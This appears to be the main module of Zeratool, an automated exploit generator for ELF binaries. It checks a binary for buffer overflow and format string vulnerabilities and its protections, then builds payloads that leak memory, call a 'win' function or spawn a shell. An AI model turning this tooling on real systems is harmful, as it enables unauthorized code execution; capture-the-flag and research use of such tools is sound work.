#!/usr/bin/env python
from __future__ import print_function

import logging
import os
import subprocess
from dataclasses import dataclass
from enum import Enum

import formatDetector
import formatExploiter
import formatLeak
import overflowDetector
import overflowExploiter
import overflowExploitSender
import protectionDetector
import win_functions

logging.basicConfig()
logging.root.setLevel(logging.INFO)

loud_loggers = [
    "angr.engines",
    "angr.sim_manager",
    "angr.simos",
    "angr.project",
    "angr.procedures",
    "cle",
    "angr.storage",
    "pyvex.expr",
]

log = logging.getLogger(__name__)


class ZeratoolInputStreams(Enum):
    STDIN = "STDIN"
    ARGUMENTS = "ARG"


@dataclass
class ZeratoolExploit:
    class Outcomes(Enum):
        SHELL = "SHELL"
        CALL_TO_WIN = "CALL_TO_WIN"
        LEAK = "LEAK"

    payload: bytes
    outcome: Outcomes


def _get_local_libc_path() -> str:
    return subprocess.check_output(["gcc", "--print-file-name=libc.so"]).decode("utf-8")


def exploit(
    file: str,
    input_stream: ZeratoolInputStreams,
    format_only: bool = False,
    overflow_only: bool = False,
    win_funcs: list = None,
    leak_format: bytes = "",
    skip_check: bool = False,
    force_shellcode: bool = False,
    force_dlresolve: bool = False,
) -> ZeratoolExploit:
    """Exploits a binary.

    Args:
        file (str): Path to the ELF file to be exploited
        input_stream (ZeratoolInputStreams): Stream to send input to
        format_only (bool, optional): Exploit only with format string attacks. Defaults
            to False.
        overflow_only (bool, optional): Exploit only with overflow attacks. Defaults to
            False.
        win_funcs (list, optional): Names of win functions If specified, then ROP and
            shellcode attacks will not be performed. Defaults to None.
        leak_format (bytes, optional): Format that a valid memory leak should respect.
            Defaults to "".
        skip_check (bool, optional): Skip all checks of the vulnerability. Defaults to
            False.
        force_shellcode (bool, optional): Force the exploit to use shellcodes. Defaults
            to False.
        force_dlresolve (bool, optional): Force the exploit to use dlresolve. Defaults
            to False.

    Returns:
        ZeratoolExploit: Generated exploit
    """
    if file is None:
        log.info("[-] Exitting no file specified")
        exit(1)

    logging.basicConfig(level=logging.DEBUG)

    # For stack problems where env gets shifted
    # based on path, using the abs path everywhere
    # makes it consistent
    file = os.path.abspath(file)

    properties = {}
    properties["file"] = file
    properties["input_type"] = input_stream.value
    properties["libc"] = None
    properties["force_shellcode"] = force_shellcode
    properties["pwn_type"] = {}
    properties["pwn_type"]["type"] = None
    properties["force_dlresolve"] = force_dlresolve
    properties["win_functions"] = (
        win_functions.translate_win_names_to_refs(file, win_funcs) if win_funcs else []
    )

    log.info("[+] Checking pwn type...")

    returned_exploit = None

    # Checking if overflow attack is possible (only if not disabled explicitely)
    if not format_only and not skip_check:
        log.info("[+] Checking for overflow pwn type...")
        properties["pwn_type"] = overflowDetector.checkOverflow(
            file, inputType=properties["input_type"]
        )

    # Checking if format attack is possible (every time)
    if not overflow_only:
        if properties["pwn_type"]["type"] is None:
            log.info("[+] Checking for format string pwn type...")
            properties["pwn_type"] = formatDetector.checkFormat(
                file, inputType=properties["input_type"]
            )

    # Set the exploitation type
    if skip_check and overflow_only:
        properties["pwn_type"]["type"] = "Overflow"
    if skip_check and format_only:
        properties["pwn_type"]["type"] = "Format"

    # Get mitigations
    log.info("[+] Getting binary protections")
    properties["protections"] = protectionDetector.getProperties(file)

    # Leak memory with format string attacks
    if properties["pwn_type"]["type"] == "Format":
        log.info("[+] Checking for memory leak")
        payload = formatLeak.checkLeak(file, properties, leak_format)

        if payload:
            returned_exploit = (payload, "LEAK")

    # Exploit with overflow attack
    if properties["pwn_type"]["type"] == "Overflow":
        log.info("[+] Exploiting overflow")

        properties["pwn_type"]["results"] = {}
        properties["pwn_type"]["results"] = overflowExploiter.exploitOverflow(
            file, properties, inputType=properties["input_type"]
        )
        if properties["pwn_type"]["results"]["type"]:
            payload = overflowExploitSender.sendExploit(file, properties)
            if payload:
                returned_exploit = (payload, "CALL_TO_WIN" if win_funcs else "SHELL")

    # Exploit with overflow attack for function
    elif properties["pwn_type"]["type"] == "overflow_variable":
        properties["pwn_type"]["results"] = properties["pwn_type"]
        payload = overflowExploitSender.sendExploit(file, properties)

        if payload:
            returned_exploit = (payload, "CALL_TO_WIN" if win_funcs else "SHELL")

    # Exploit with format string attack
    elif properties["pwn_type"]["type"] == "Format":
        returned_exploit = formatExploiter.exploitFormat(file, properties, leak_format)

    else:
        log.info("[-] Can not determine vulnerable type")

    if returned_exploit:
        return ZeratoolExploit(
            returned_exploit[0], ZeratoolExploit.Outcomes(returned_exploit[1])
        )
    else:
        return None
